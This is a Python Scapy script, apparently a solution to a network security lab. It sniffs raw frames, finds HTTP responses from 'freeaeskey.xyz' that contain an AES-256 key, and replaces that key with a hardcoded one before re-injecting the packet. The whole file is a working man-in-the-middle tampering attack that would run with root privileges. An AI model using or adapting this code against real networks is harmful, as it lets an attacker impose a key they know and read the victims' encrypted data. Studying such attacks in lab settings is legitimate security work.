from scapy.all import send, conf, L3RawSocket, TCP, IP, Ether, Raw
import socket
import re
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

# Known AES key to inject
known_key = '4d6167696320576f7264733a2053717565616d697368204f7373696672616765'
target_domain = 'freeaeskey.xyz'
key_pattern = r'[0-9a-fA-F]{64}'  # Adjust this if necessary

# Use this function to send packets
def inject_pkt(pkt):
    try:
        conf.L3socket = L3RawSocket
        send(pkt, verbose=0)
        logging.info("Injected modified packet.")
    except Exception as e:
        logging.error(f"Error injecting packet: {e}")

# This function handles the incoming packet
def handle_pkt(pkt):
    try:
        eth = Ether(pkt)  # Convert raw packet to Ethernet frame
        if eth.haslayer(IP) and eth.haslayer(TCP):
            ip = eth[IP]
            tcp = eth[TCP]

            # Only process packets with raw data (likely HTTP)
            if eth.haslayer(Raw):
                payload = eth[Raw].load.decode('utf-8', errors='ignore')

                # Look for HTTP response containing the key from freeaeskey.xyz
                if target_domain in payload and 'AES-256 key' in payload:
                    logging.info(f"Intercepted response from {target_domain}.")
                    
                    # Find the key using regex
                    match = re.search(key_pattern, payload)
                    
                    if match:
                        original_key = match.group(0)
                        logging.info(f"Original Key Found: {original_key}")
                        
                        # Replace the key with the known one
                        modified_payload = payload.replace(original_key, known_key)
                        logging.info(f"Key replaced with: {known_key}")
                        
                        # Modify the packet's payload
                        eth[Raw].load = modified_payload.encode('utf-8')

                        # Recompute checksums and length
                        del eth[IP].len
                        del eth[IP].chksum
                        del eth[TCP].chksum
                        
                        # Inject the modified packet
                        inject_pkt(eth)
                    else:
                        logging.info("No key found in the response.")
                else:
                    # Forward unmodified packet if not relevant
                    inject_pkt(eth)
    except Exception as e:
        logging.error(f"Error handling packet: {e}")

def main():
    try:
        logging.info("Starting packet sniffer...")
        # Open raw socket to capture all Ethernet frames
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        
        while True:
            pkt = s.recv(0xffff)
            handle_pkt(pkt)

    except PermissionError:
        logging.critical("You need to run this script as root or with sudo.")
    except Exception as e:
        logging.critical(f"Critical error occurred: {e}")

if __name__ == '__main__':
    main()
